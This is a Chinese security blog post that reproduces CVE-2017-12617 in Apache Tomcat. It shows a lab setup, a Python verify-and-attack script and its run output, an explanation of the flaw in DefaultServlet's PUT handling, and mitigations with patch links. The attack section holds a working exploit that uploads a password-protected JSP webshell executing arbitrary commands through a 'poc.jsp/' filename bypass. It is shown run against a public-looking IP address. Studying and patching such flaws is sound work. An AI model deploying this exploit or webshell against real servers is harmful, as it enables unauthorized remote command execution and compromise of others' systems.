<!doctype html><html lang="zh"><head><meta charset="utf-8"><meta name="generator" content="Hexo 4.2.0"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><meta><title>CVE-2017-12617 - 食兔人的博客</title><meta description="¶基本信息When running Apache Tomcat versions 9.0.0.M1 to 9.0.0, 8.5.0 to 8.5.22, 8.0.0.RC1 to 8.0.46 and 7.0.0 to 7.0.81 with HTTP PUTs enabled (e.g. via setting the readonly initialisation parameter of t"><meta property="og:type" content="blog"><meta property="og:title" content="食兔人的博客"><meta property="og:url" content="https://blog.ycdxsb.cn/e50797f2.html"><meta property="og:site_name" content="食兔人的博客"><meta property="og:description" content="¶基本信息When running Apache Tomcat versions 9.0.0.M1 to 9.0.0, 8.5.0 to 8.5.22, 8.0.0.RC1 to 8.0.46 and 7.0.0 to 7.0.81 with HTTP PUTs enabled (e.g. via setting the readonly initialisation parameter of t"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/2020-09-18-044448.jpg"><meta property="og:image" content="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/2020-09-18-044458.jpg"><meta property="article:published_time" content="2020-09-18T04:22:00.000Z"><meta property="article:modified_time" content="2020-10-30T03:24:15.157Z"><meta property="article:author" content="ycdxsb"><meta property="article:tag" content="CTF"><meta property="article:tag" content="CVE"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/2020-09-18-044448.jpg"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.ycdxsb.cn/e50797f2.html"},"headline":"食兔人的博客","image":["https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/2020-09-18-044448.jpg","https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/2020-09-18-044458.jpg"],"datePublished":"2020-09-18T04:22:00.000Z","dateModified":"2020-10-30T03:24:15.157Z","author":{"@type":"Person","name":"ycdxsb"},"description":"¶基本信息When running Apache Tomcat versions 9.0.0.M1 to 9.0.0, 8.5.0 to 8.5.22, 8.0.0.RC1 to 8.0.46 and 7.0.0 to 7.0.81 with HTTP PUTs enabled (e.g. via setting the readonly initialisation parameter of t"}</script><link rel="canonical" href="https://blog.ycdxsb.cn/e50797f2.html"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" defer></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css"><script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script><link rel="alternate" href="/atom.xml" title="食兔人的博客" type="application/atom+xml">
<link rel="alternate" href="/rss2.xml" title="食兔人的博客" type="application/rss+xml">
</head><body class="is-3-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/">食兔人的博客</a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-6-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><time class="level-item" datetime="2020-09-18T04:22:00.000Z" title="2020-09-18T04:22:00.000Z">2020-09-18</time><span class="level-item"> ycdxsb </span><span class="level-item"><a class="link-muted" href="/categories/CTF/">CTF</a><span> / </span><a class="link-muted" href="/categories/CTF/CVE/">CVE</a></span><span class="level-item">7 分钟 读完 (大约 1000 个字)</span><span class="level-item" id="busuanzi_container_page_pv"><i class="far fa-eye"></i>&nbsp;&nbsp;<span id="busuanzi_value_page_pv">0</span>次访问</span></div></div><h1 class="title is-3 is-size-4-mobile">CVE-2017-12617</h1><div class="content"><h3><span id="pji-ben-xin-xi">基本信息</span><a href="#pji-ben-xin-xi" class="header-anchor">#</a></h3><blockquote><p>When running Apache Tomcat versions 9.0.0.M1 to 9.0.0, 8.5.0 to 8.5.22, 8.0.0.RC1 to 8.0.46 and 7.0.0 to 7.0.81 with HTTP PUTs enabled (e.g. via setting the readonly initialisation parameter of the Default servlet to false) it was possible to upload a JSP file to the server via a specially crafted request. This JSP could then be requested and any code it contained would be executed by the server.</p></blockquote><a id="more"></a><p><strong>影响范围：</strong></p><ul><li>7.0.0 - 7.0.81</li><li>8.0.0.RC1 - 8.0.46</li><li>8.5.0 - 8.5.22</li><li>9.0.0.M1 - 9.0.0</li></ul><p><strong>描述：</strong></p><p>当在<code>Tomcat</code>的<code>web.xml</code>配置文件中设置<code>readonly</code>为<code>false</code>时，攻击者可以通过<code>PUT</code>请求能够上传任意文件，当上传恶意的<code>jsp</code>文件时，就可以通过<code>jsp</code>的<code>webshell</code>文件获得<code>shell</code></p><h3><span id="plou-dong-fu-xian">漏洞复现</span><a href="#plou-dong-fu-xian" class="header-anchor">#</a></h3><h4><span id="phuan-jing-pei-zhi">环境配置</span><a href="#phuan-jing-pei-zhi" class="header-anchor">#</a></h4><p><strong>Step1</strong> ：<a href="http://archive.apache.org/dist/tomcat/tomcat-7/v7.0.79/bin/apache-tomcat-7.0.79.tar.gz">http://archive.apache.org/dist/tomcat/tomcat-7/v7.0.79/bin/apache-tomcat-7.0.79.tar.gz</a></p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/2020-09-18-044448.jpg" alt="image-20200916170033271"></p><p><strong>Step 2</strong>：修改配置文件，增加<code>readonly = false</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">    &lt;servlet&gt;</span><br><span class="line">        &lt;servlet-name&gt;default&lt;&#x2F;servlet-name&gt;</span><br><span class="line">        &lt;servlet-class&gt;org.apache.catalina.servlets.DefaultServlet&lt;&#x2F;servlet-class&gt;</span><br><span class="line">        &lt;init-param&gt;</span><br><span class="line">            &lt;param-name&gt;debug&lt;&#x2F;param-name&gt;</span><br><span class="line">            &lt;param-value&gt;0&lt;&#x2F;param-value&gt;</span><br><span class="line">        &lt;&#x2F;init-param&gt;</span><br><span class="line">        &lt;init-param&gt;</span><br><span class="line">            &lt;param-name&gt;listings&lt;&#x2F;param-name&gt;</span><br><span class="line">            &lt;param-value&gt;false&lt;&#x2F;param-value&gt;</span><br><span class="line">        &lt;&#x2F;init-param&gt;</span><br><span class="line">+        &lt;init-param&gt;</span><br><span class="line">+            &lt;param-name&gt;readonly&lt;&#x2F;param-name&gt;</span><br><span class="line">+            &lt;param-value&gt;false&lt;&#x2F;param-value&gt;</span><br><span class="line">+        &lt;&#x2F;init-param&gt;</span><br><span class="line">        &lt;load-on-startup&gt;1&lt;&#x2F;load-on-startup&gt;</span><br><span class="line">    &lt;&#x2F;servlet&gt;</span><br></pre></td></tr></table></figure><h4><span id="pgong-ji">攻击</span><a href="#pgong-ji" class="header-anchor">#</a></h4><p><strong>Step1</strong> ：构造<code>PUT</code>请求验证漏洞是否存在</p><p>请求如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">def verify(url,port):</span><br><span class="line">    vul_url &#x3D; url+&quot;:&quot;+port</span><br><span class="line">    print(&quot;target:&quot;,vul_url)</span><br><span class="line"></span><br><span class="line">    poc_path &#x3D; urlparse.urljoin(vul_url,&quot;test.txt&quot;)</span><br><span class="line">    print(poc_path)</span><br><span class="line">    payload &#x3D; &quot;This is Vulnerable CVE-2017-12617!&quot;</span><br><span class="line"></span><br><span class="line">    poc_req &#x3D; requests.put(url &#x3D; poc_path,data &#x3D; payload, verify &#x3D; False)</span><br><span class="line"></span><br><span class="line">    poc_content &#x3D; requests.get(url &#x3D; poc_path,verify &#x3D; False).content</span><br><span class="line">    if(&quot;CVE-2017-12617&quot; in poc_content):</span><br><span class="line">        print(&quot;CVE-2017-12617 exsits in this target!&quot;)</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;No CVE-2017-12617 in this target!&quot;)</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># python CVE-2017-12617.py -u http:&#x2F;&#x2F;47.100.18.67 -p 8080 --choice verify</span><br><span class="line">(&#39;target:&#39;, &#39;http:&#x2F;&#x2F;47.100.18.67:8080&#39;)</span><br><span class="line">http:&#x2F;&#x2F;47.100.18.67:8080&#x2F;test.txt</span><br><span class="line">CVE-2017-12617 exsits in this target!</span><br></pre></td></tr></table></figure><p>同时可以看到在根目录下出现了<code>test.txt</code>文件</p><p><strong>Step2：</strong> 上传恶意jsp文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">def attack(url,port):</span><br><span class="line">    payload &#x3D; &quot;&quot;&quot;&lt;%</span><br><span class="line">    if(&quot;password&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123;</span><br><span class="line">        java.io.InputStream in &#x3D; Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();</span><br><span class="line">        int a &#x3D; -1;</span><br><span class="line">        byte[] b &#x3D; new byte[2048];</span><br><span class="line">        out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">        while((a&#x3D;in.read(b))!&#x3D;-1)&#123;</span><br><span class="line">            out.println(new String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(&quot;&lt;&#x2F;pre&gt;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;&quot;&quot;&quot;</span><br><span class="line">    vul_url &#x3D; url+&quot;:&quot;+port</span><br><span class="line">    print(&quot;target:&quot;,vul_url)</span><br><span class="line"></span><br><span class="line">    #由于本身不允许直接上传jsp文件，但可能可以通过构造绕过</span><br><span class="line">    #参考:https:&#x2F;&#x2F;www.cnblogs.com&#x2F;leixiao-&#x2F;p&#x2F;10264236.html</span><br><span class="line">    poc_path &#x3D; urlparse.urljoin(vul_url,&quot;poc.jsp&#x2F;&quot;)</span><br><span class="line">    print(poc_path)</span><br><span class="line"></span><br><span class="line">    poc_req &#x3D; requests.put(url &#x3D; poc_path,data &#x3D; payload, verify &#x3D; False)</span><br><span class="line">    print(poc_req.status_code)</span><br><span class="line">    poc_content &#x3D; requests.get(url &#x3D; urlparse.urljoin(vul_url,&quot;poc.jsp&quot;)+&quot;?pwd&#x3D;password&amp;i&#x3D;whoami&quot;,verify &#x3D; False).content</span><br><span class="line">    if(poc_content&#x3D;&#x3D;&quot;&quot;):</span><br><span class="line">        print(&quot;Attack failed!&quot;)</span><br><span class="line">    else:</span><br><span class="line">        # print(&quot;whoami result:&quot;,poc_content)</span><br><span class="line">        print(&quot;Attack success!&quot;)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># python CVE-2017-12617.py -u http:&#x2F;&#x2F;47.100.18.67 -p 8080 --choice attack</span><br><span class="line">(&#39;target:&#39;, &#39;http:&#x2F;&#x2F;47.100.18.67:8080&#39;)</span><br><span class="line">http:&#x2F;&#x2F;47.100.18.67:8080&#x2F;poc.jsp&#x2F;</span><br><span class="line">Attack success!</span><br></pre></td></tr></table></figure><p><code>http://47.100.18.67:8080/poc.jsp?pwd=password&amp;i=ls</code></p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/2020-09-18-044458.jpg" alt="image-20200916184617682"></p><h3><span id="pyuan-li">原理</span><a href="#pyuan-li" class="header-anchor">#</a></h3><p><code>./conf/web.xml</code></p><p>从配置文件可以看到，<code>.jsp</code>和<code>.jspx</code>后缀会交给<code>org.apache.jasper.servlet.JspServlet</code>类进行处理，其余交给<code>org.apache.catalina.servlets.DefaultServlet</code>类处理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">104         &lt;servlet-name&gt;default&lt;&#x2F;servlet-name&gt;</span><br><span class="line">105         &lt;servlet-class&gt;org.apache.catalina.servlets.DefaultServlet&lt;&#x2F;servlet-class&gt;</span><br><span class="line">...</span><br><span class="line">251         &lt;servlet-name&gt;jsp&lt;&#x2F;servlet-name&gt;</span><br><span class="line">252         &lt;servlet-class&gt;org.apache.jasper.servlet.JspServlet&lt;&#x2F;servlet-class&gt;</span><br><span class="line">...</span><br><span class="line">382     &lt;servlet-mapping&gt;</span><br><span class="line">383         &lt;servlet-name&gt;default&lt;&#x2F;servlet-name&gt;</span><br><span class="line">384         &lt;url-pattern&gt;&#x2F;&lt;&#x2F;url-pattern&gt;</span><br><span class="line">385     &lt;&#x2F;servlet-mapping&gt;</span><br><span class="line">...</span><br><span class="line">388     &lt;servlet-mapping&gt;</span><br><span class="line">389         &lt;servlet-name&gt;jsp&lt;&#x2F;servlet-name&gt;</span><br><span class="line">390         &lt;url-pattern&gt;*.jsp&lt;&#x2F;url-pattern&gt;</span><br><span class="line">391         &lt;url-pattern&gt;*.jspx&lt;&#x2F;url-pattern&gt;</span><br><span class="line">392     &lt;&#x2F;servlet-mapping&gt;</span><br></pre></td></tr></table></figure><h4><span id="pdefaultservlet">DefaultServlet</span><a href="#pdefaultservlet" class="header-anchor">#</a></h4><p><code>./java/org/apache/catalina/servlets/DefaultServlet.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPut</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">            <span class="comment">// 检查readOnly</span></span><br><span class="line">    <span class="keyword">if</span> (readOnly) &#123;</span><br><span class="line">        resp.sendError(HttpServletResponse.SC_FORBIDDEN);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String path = getRelativePath(req);</span><br><span class="line">            <span class="comment">// 判断文件是否已经存在</span></span><br><span class="line">    <span class="keyword">boolean</span> exists = <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        resources.lookup(path);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">        exists = <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">boolean</span> result = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Temp. content file used to support partial PUT</span></span><br><span class="line">    File contentFile = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    Range range = parseContentRange(req, resp);</span><br><span class="line"></span><br><span class="line">    InputStream resourceInputStream = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Append data specified in ranges to existing content for this</span></span><br><span class="line">    <span class="comment">// resource - create a temp. file on the local filesystem to</span></span><br><span class="line">    <span class="comment">// perform this operation</span></span><br><span class="line">    <span class="comment">// Assume just one range is specified for now</span></span><br><span class="line">    <span class="comment">// 得到put请求的内容</span></span><br><span class="line">    <span class="keyword">if</span> (range != <span class="keyword">null</span>) &#123;</span><br><span class="line">        contentFile = executePartialPut(req, range, path);</span><br><span class="line">        resourceInputStream = <span class="keyword">new</span> FileInputStream(contentFile);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        resourceInputStream = req.getInputStream();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 将内容输出到文件中</span></span><br><span class="line">        Resource newResource = <span class="keyword">new</span> Resource(resourceInputStream);</span><br><span class="line">        <span class="comment">// <span class="doctag">FIXME:</span> Add attributes</span></span><br><span class="line">        <span class="keyword">if</span> (exists) &#123;</span><br><span class="line">            resources.rebind(path, newResource);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            resources.bind(path, newResource);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(NamingException e) &#123;</span><br><span class="line">        result = <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (result) &#123;</span><br><span class="line">        <span class="keyword">if</span> (exists) &#123;</span><br><span class="line">            resp.setStatus(HttpServletResponse.SC_NO_CONTENT);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            resp.setStatus(HttpServletResponse.SC_CREATED);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        resp.sendError(HttpServletResponse.SC_CONFLICT);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>判断readOnly是否开启</li><li>判断文件是否已存在</li><li>将PUT请求内容输出到文件</li></ul><h4><span id="pli-yong-fang-fa">利用方法</span><a href="#pli-yong-fang-fa" class="header-anchor">#</a></h4><p>由于<code>Tomcat</code>本身不允许上传<code>jsp</code>文件，因此选择使用<code>DefaultServlet</code>创建<code>jsp</code>文件</p><p>利用操作系统的特性：</p><ul><li>Windows不会识别空格为文件名后缀</li><li>Linux不会识别<code>/</code>为文件名后缀</li></ul><p>因此上传时设置文件名为<code>jsp%20</code>或者<code>jsp/</code>，让<code>Tomcat</code>使用<code>DefaultServlet</code>创建文件，由于系统特性，最后生成的文件为<code>jsp</code>文件，攻击者访问即可<code>get shell</code></p><h4><span id="pfang-hu-fang-fa">防护方法</span><a href="#pfang-hu-fang-fa" class="header-anchor">#</a></h4><ol><li>不启用<code>readonly</code>设置</li><li>在<code>DefaultServlet</code>中加入对<code>/</code>以及<code>%20</code>的判断</li><li>patch链接：<ul><li><a href="https://github.com/apache/tomcat/commit/b7e0435d17aba69f16ae9e8a78ad0f1565b552af">https://github.com/apache/tomcat/commit/b7e0435d17aba69f16ae9e8a78ad0f1565b552af</a></li><li><a href="https://github.com/apache/tomcat/commit/b577f9a7996b92b650b1649af3c3bae11c120db9">https://github.com/apache/tomcat/commit/b577f9a7996b92b650b1649af3c3bae11c120db9</a></li></ul></li></ol><h3><span id="pcan-kao-zi-liao">参考资料</span><a href="#pcan-kao-zi-liao" class="header-anchor">#</a></h3><ul><li><a href="https://www.freebuf.com/vuls/150203.html">CVE-2017-12617-Tomcat远程代码执行漏洞复现测试</a></li><li><a href="https://github.com/ycdxsb/CVEs/tree/master/tomcat-CVE-2017-12617">CVE-2017-12617 EXP</a></li></ul></div><div class="article-tags size-small mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/CTF/">CTF</a><a class="link-muted mr-2" rel="tag" href="/tags/CVE/">CVE</a></div><div class="a2a_kit a2a_kit_size_32 a2a_default_style"><a class="a2a_dd" href="https://www.addtoany.com/share"></a><a class="a2a_button_facebook"></a><a class="a2a_button_twitter"></a><a class="a2a_button_telegram"></a><a class="a2a_button_whatsapp"></a><a class="a2a_button_reddit"></a></div><script src="https://static.addtoany.com/menu/page.js" defer></script></article></div><div class="card"><div class="card-content"><h3 class="menu-label has-text-centered">喜欢这篇文章？打赏一下作者吧</h3><div class="buttons is-centered"><a class="button is-info donate"><span class="icon is-small"><i class="fab fa-alipay"></i></span><span>支付宝</span><span class="qrcode"><img src="/images/alipay.jpeg" alt="支付宝"></span></a><a class="button is-success donate"><span class="icon is-small"><i class="fab fa-weixin"></i></span><span>微信</span><span class="qrcode"><img src="/images/wechatpay.jpeg" alt="微信"></span></a></div></div></div><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/f95006f9.html"><i class="level-item fas fa-chevron-left"></i><span class="level-item">CVE-2020-1938</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/762edb82.html"><span class="level-item">5space 线下决赛部分 writeup</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">评论</h3><div class="content" id="valine-thread"></div><script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js"></script><script>new Valine({el:"#valine-thread",appId:"arzLjs0uhdNidwVh9BC6XEl2-gzGzoHsz",appKey:"UTxl8VuzUJM8vVhRdRKuNIM6",placeholder:"ヾﾉ≧∀≦)o 来呀！快活呀！~",avatar:"mm",meta:["nick","mail","link"],pageSize:10,lang:"zh-CN",highlight:!0,requiredFields:[]})</script></div></div></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen order-1 is-sticky"><div class="card widget"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="https://www.gravatar.com/avatar/9b722a00f4fc188a2dbfa47ac65b8773?s=128" alt="食兔人"></figure><p class="title is-size-4 is-block line-height-inherit">食兔人</p><p class="is-size-6 is-block">学生,信息安全爱好者</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>北京,中国</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">75</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">27</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">27</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/ycdxsb" target="_blank" rel="noopener">关注我</a></div><div class="level is-mobile"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/ycdxsb"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Twitter" href="https://twitter.com/ycdxsb"><i class="fab fa-twitter"></i></a></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">链接</h3><ul class="menu-list"><li><a class="level is-mobile is-mobile" href="http://m0te.top/" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Mote</span></span><span class="level-right"><span class="level-item tag">m0te.top</span></span></a></li><li><a class="level is-mobile is-mobile" href="https://yurisec.cn/" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Yuri</span></span><span class="level-right"><span class="level-item tag">yurisec.cn</span></span></a></li><li><a class="level is-mobile is-mobile" href="https://nullpointer.me/" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Mad</span></span><span class="level-right"><span class="level-item tag">nullpointer.me</span></span></a></li></ul></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile is-marginless" href="/archives/2020/12/"><span class="level-start"><span class="level-item">十二月 2020</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/11/"><span class="level-start"><span class="level-item">十一月 2020</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/10/"><span class="level-start"><span class="level-item">十月 2020</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/09/"><span class="level-start"><span class="level-item">九月 2020</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/08/"><span class="level-start"><span class="level-item">八月 2020</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/07/"><span class="level-start"><span class="level-item">七月 2020</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/06/"><span class="level-start"><span class="level-item">六月 2020</span></span><span class="level-end"><span class="level-item tag">5</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/05/"><span class="level-start"><span class="level-item">五月 2020</span></span><span class="level-end"><span class="level-item tag">6</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/04/"><span class="level-start"><span class="level-item">四月 2020</span></span><span class="level-end"><span class="level-item tag">28</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/03/"><span class="level-start"><span class="level-item">三月 2020</span></span><span class="level-end"><span class="level-item tag">13</span></span></a></li></ul></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">订阅更新</h3><form action="https://feedburner.google.com/fb/a/mailverify" method="post" target="popupwindow" onsubmit="window.open(&#039;https://feedburner.google.com/fb/a/mailverify?uri=ycdxsb/fVNc&#039;,&#039;popupwindow&#039;,&#039;scrollbars=yes,width=550,height=520&#039;);return true"><input type="hidden" value="ycdxsb/fVNc" name="uri"><input type="hidden" name="loc" value="en_US"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button is-primary" type="submit" value="订阅"></div></div><p class="help">邮件订阅，更新早知道</p></form></div></div></div><div class="column-right-shadow is-hidden-widescreen"></div></div><div class="column column-right is-4-tablet is-4-desktop is-3-widescreen is-hidden-touch is-hidden-desktop-only order-3"><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">分类</h3><ul class="menu-list"><li><a class="level is-mobile is-marginless" href="/categories/AI/"><span class="level-start"><span class="level-item">AI</span></span><span class="level-end"><span class="level-item tag">2</span></span></a><ul class="mr-0"><li><a class="level is-mobile is-marginless" href="/categories/AI/NLP/"><span class="level-start"><span class="level-item">NLP</span></span><span class="level-end"><span 